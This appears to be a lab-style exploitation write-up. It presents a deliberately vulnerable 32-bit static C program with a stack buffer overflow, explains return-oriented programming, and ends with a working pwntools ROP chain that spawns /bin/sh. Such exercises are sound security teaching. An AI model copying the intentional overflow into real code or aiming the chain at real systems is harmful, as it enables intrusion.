# ROP Static

## Source Code

```C
// gcc -m32 -fno-stack-protector -no-pie -static -o vuln vuln.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

char *str = "/bin/sh";          // <- RODATA

#define BUFFSIZE 136

void vuln()
{
    char buffer[BUFFSIZE];
    read(0, buffer, 0x200);     // <- this code causes buffer overflow
}

int main()
{
    vuln();
}
```

## Overview & Main Idea

- Let's check some informations about binary file

![img](/ROP/Static/assets/check_file.png)

> NX is enabled so we can't ret2shellcode, but this program has statically linked and no PIE, we can use ROPgadget to find some gadgets in binary file and use it to implement something like exceve("/bin/sh", 0, 0) to get shell :3

## Details

### A bit about ROP

- Return Oriented Programming is a technique in which we use existing small snippets of assembly code/gadgets to create a chain of instructions which will eventually spawn a shell or cause the program to do some complex things. This is method is usually employed when there is a Stack buffer overflow and there are no win or give_shell functions. So we use ROP to invoke system or an execve syscall.

- Its called ROP as the basic idea of the technique is to use the ret statement to change control flow of the program. We use a tool called ROPgadget for finding gadgets. Another tool used for the same is ropper

- You can see this image to understand how does ROP work

![img](/ROP/Static/assets/ROP.png)

- To implement exceve("/bin/sh", 0, 0), we look up the syscall table of x86_32 bit 

![img](/ROP/Static/assets/exceve_syscall.png)

```
exceve("/bin/sh", 0, 0) in assembly

eax     -     0x0b
ebx     -     char* "/bin/sh"
ecx     -     0x0
edx     -     0x0

int     0x80
```

- First we find the offset that we need to overwrite. By some simple steps, I find it's 148 bytes :3.

- Next, I found some gadgets below with ROPgadget.

![img](/ROP/Static/assets/gadget.png)

- Finally, we need to find "/bin/sh" string, "/bin/sh" stored in RODATA because of its initialization `char *str = "/bin/sh"`

![img](/ROP/Static/assets/bin_sh.png)

## Exploit

```python
# 0x0806003e : pop edx ; pop ebx ; pop esi ; ret
# 0x080a8b2a : pop eax ; pop ebx ; pop esi ; pop edi ; ret
# 0x0805d393 : pop ecx ; ret
# 0x80b3008    "/bin/sh"
# 0x0804b5c2   int 0x80
# offset 148

from pwn import *

elf = ELF("./vuln")
p = elf.process()

payload = b"a"*148
payload += p32(0x0806003e)
payload += p32(0x0)
payload += p32(0x1)
payload += p32(0x2)
payload += p32(0x080a8b2a)
payload += p32(0x0b)
payload += p32(0x80b3008)
payload += p32(0x0)
payload += p32(0x0)
payload += p32(0x0805d393)
payload += p32(0x0)
payload += p32(0x0804b5c2)

p.sendline(payload)
p.interactive()
```

## Result

![img](/ROP/Static/assets/result.png)